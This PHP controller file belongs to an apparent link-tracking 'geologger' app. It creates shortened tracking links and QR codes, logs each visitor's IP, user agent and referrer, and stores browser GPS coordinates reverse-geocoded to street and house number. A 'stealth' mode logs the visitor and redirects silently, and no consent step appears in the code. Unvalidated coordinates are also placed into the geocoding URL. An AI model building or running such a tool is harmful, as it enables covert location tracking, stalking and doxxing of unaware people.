<?php
namespace App\Controllers;

use App\Core\Controller;
use App\Models\GeoLink;
use App\Models\GeoLog;
use App\Config\App;

class GeologgerController extends Controller {
    private $geoLink;
    private $geoLog;
    
    public function __construct($params = []) {
        parent::__construct($params);
        $this->geoLink = new GeoLink();
        $this->geoLog = new GeoLog();
    }
    
    public function create() {
        if ($this->isPost()) {
            $this->validateCSRF();
            
            $originalUrl = $this->sanitizeInput($this->getPost('original_url'));
            $expiresAt = $this->getPost('expires_at');
            $noExpiration = $this->getPost('no_expiration') === '1';
            $clickLimit = $this->getPost('click_limit');
            
            $errors = $this->validateRequired(['original_url' => $originalUrl], ['original_url']);
            
            if (empty($errors)) {
                try {
                    // Generate short code
                    $shortCode = $this->geoLink->generateShortCode();
                    
                    // Handle expiration settings
                    $finalExpiresAt = null;
                    if (!$noExpiration && !empty($expiresAt)) {
                        $finalExpiresAt = date('Y-m-d H:i:s', strtotime($expiresAt));
                    }
                    
                    // Handle click limit
                    $finalClickLimit = null;
                    if (!empty($clickLimit) && is_numeric($clickLimit)) {
                        $finalClickLimit = (int)$clickLimit;
                    }
                    
                    // Create tracking link
                    $linkData = [
                        'original_url' => $originalUrl,
                        'short_code' => $shortCode,
                        'expires_at' => $finalExpiresAt,
                        'click_limit' => $finalClickLimit
                    ];
                    
                    $linkId = $this->geoLink->create($linkData);
                    
                    // Get tracking URL and QR code
                    $trackingUrl = $this->geoLink->getTrackingUrl($shortCode);
                    $qrCodeUrl = $this->geoLink->getQRCodeUrl($shortCode);
                    
                    $data = [
                        'title' => 'Link Created - ' . App::APP_NAME,
                        'success' => true,
                        'link' => [
                            'id' => $linkId,
                            'short_code' => $shortCode,
                            'original_url' => $originalUrl,
                            'tracking_url' => $trackingUrl,
                            'qr_code_url' => $qrCodeUrl,
                            'expires_at' => $finalExpiresAt,
                            'click_limit' => $finalClickLimit
                        ],
                        'csrf_token' => $this->generateCSRFToken()
                    ];
                    
                    return $this->render('geologger/create', $data);
                    
                } catch (\Exception $e) {
                    $this->logError('Failed to create tracking link', [
                        'error' => $e->getMessage(),
                        'original_url' => $originalUrl
                    ]);
                    
                    $errors[] = 'Failed to create tracking link. Please try again.';
                }
            }
            
            $data = [
                'title' => 'Create Tracking Link - ' . App::APP_NAME,
                'errors' => $errors,
                'form_data' => [
                    'original_url' => $originalUrl,
                    'expires_at' => $expiresAt,
                    'no_expiration' => $noExpiration,
                    'click_limit' => $clickLimit
                ],
                'csrf_token' => $this->generateCSRFToken()
            ];
            
            return $this->render('geologger/create', $data);
        }
        
        $data = [
            'title' => 'Create Tracking Link - ' . App::APP_NAME,
            'csrf_token' => $this->generateCSRFToken()
        ];
        
        return $this->render('geologger/create', $data);
    }
    
    public function logs() {
        $page = (int)($this->getGet('page', 1));
        $limit = 50;
        $offset = ($page - 1) * $limit;
        
        $logs = $this->geoLog->getAll($limit, $offset);
        $stats = $this->geoLog->getStats();
        $heatmapData = $this->geoLog->getHeatmapData();
        
        $data = [
            'title' => 'Tracking Logs - ' . App::APP_NAME,
            'logs' => $logs,
            'stats' => $stats,
            'heatmapData' => $heatmapData,
            'pagination' => [
                'page' => $page,
                'limit' => $limit,
                'total' => $this->geoLog->getTotalLogs()
            ],
            'csrf_token' => $this->generateCSRFToken()
        ];
        
        return $this->render('geologger/logs', $data);
    }
    
    public function myLinks() {
        $page = (int)($this->getGet('page', 1));
        $limit = 50;
        $offset = ($page - 1) * $limit;
        
        // Get all links with statistics
        $links = $this->geoLink->getAllWithStats($limit, $offset);
        $stats = $this->geoLink->getStats();
        
        $data = [
            'title' => 'My Tracking Links - ' . App::APP_NAME,
            'links' => $links,
            'stats' => $stats,
            'pagination' => [
                'page' => $page,
                'limit' => $limit,
                'total' => $this->geoLink->getTotalLinks()
            ],
            'csrf_token' => $this->generateCSRFToken()
        ];
        
        return $this->render('geologger/my_links', $data);
    }
    
    public function preciseTrack() {
        $code = $this->getGet('code');
        
        if (empty($code)) {
            throw new \Exception('Invalid tracking code');
        }
        
        $link = $this->geoLink->findByCode($code);
        if (!$link) {
            throw new \Exception('Link not found');
        }
        
        // If stealth mode is enabled, redirect immediately
        if (!App::SHOW_LOCATION_MESSAGES) {
            $this->handleStealthRedirect($link);
        }
        
        $data = [
            'title' => 'Precise Location Tracking - ' . App::APP_NAME,
            'link' => $link,
            'code' => $code
        ];
        
        return $this->render('geologger/precise_track', $data);
    }
    
    private function handleStealthRedirect($link) {
        // Save basic tracking data immediately
        $trackingData = [
            'link_id' => $link['id'],
            'ip_address' => App::getClientIP(),
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'referrer' => $_SERVER['HTTP_REFERER'] ?? '',
            'timestamp' => date('Y-m-d H:i:s'),
            'location_type' => 'IP'
        ];
        
        $this->geoLog->create($trackingData);
        
        // Redirect immediately
        header("Location: " . $link['original_url']);
        exit();
    }
    
    public function savePreciseLocation() {
        if (!$this->isAjax()) {
            $this->renderJson(['success' => false, 'error' => 'Invalid request']);
        }
        
        $code = $this->getPost('code');
        $latitude = $this->getPost('latitude');
        $longitude = $this->getPost('longitude');
        $accuracy = $this->getPost('accuracy');
        $locationType = $this->getPost('location_type', 'GPS');
        
        try {
            $link = $this->geoLink->findByCode($code);
            if (!$link) {
                throw new \Exception('Link not found');
            }
            
            // Get geolocation data
            $geoData = $this->getGeolocationData($latitude, $longitude);
            
            $logData = [
                'link_id' => $link['id'],
                'ip_address' => App::getClientIP(),
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'referrer' => $_SERVER['HTTP_REFERER'] ?? '',
                'latitude' => $latitude,
                'longitude' => $longitude,
                'accuracy' => $accuracy,
                'location_type' => $locationType,
                'country' => $geoData['country'] ?? null,
                'city' => $geoData['city'] ?? null,
                'address' => $geoData['address'] ?? null,
                'street' => $geoData['street'] ?? null,
                'house_number' => $geoData['house_number'] ?? null,
                'state' => $geoData['state'] ?? null,
                'postcode' => $geoData['postcode'] ?? null
            ];
            
            $logId = $this->geoLog->create($logData);
            
            $this->renderJson([
                'success' => true,
                'message' => 'Location saved successfully',
                'log_id' => $logId
            ]);
            
        } catch (\Exception $e) {
            $this->logError('Failed to save precise location', [
                'error' => $e->getMessage(),
                'code' => $code
            ]);
            
            $this->renderJson([
                'success' => false,
                'error' => $e->getMessage()
            ]);
        }
    }
    
    private function getGeolocationData($latitude, $longitude) {
        $url = App::NOMINATIM_URL . "?format=json&lat={$latitude}&lon={$longitude}&zoom=18&addressdetails=1&extratags=1";
        
        $response = @file_get_contents($url);
        if ($response === false) {
            return [];
        }
        
        $data = json_decode($response, true);
        if (!$data) {
            return [];
        }
        
        return [
            'address' => $data['display_name'] ?? '',
            'street' => $data['address']['road'] ?? '',
            'house_number' => $data['address']['house_number'] ?? '',
            'city' => $data['address']['city'] ?? $data['address']['town'] ?? $data['address']['village'] ?? '',
            'state' => $data['address']['state'] ?? '',
            'country' => $data['address']['country'] ?? '',
            'postcode' => $data['address']['postcode'] ?? ''
        ];
    }
} 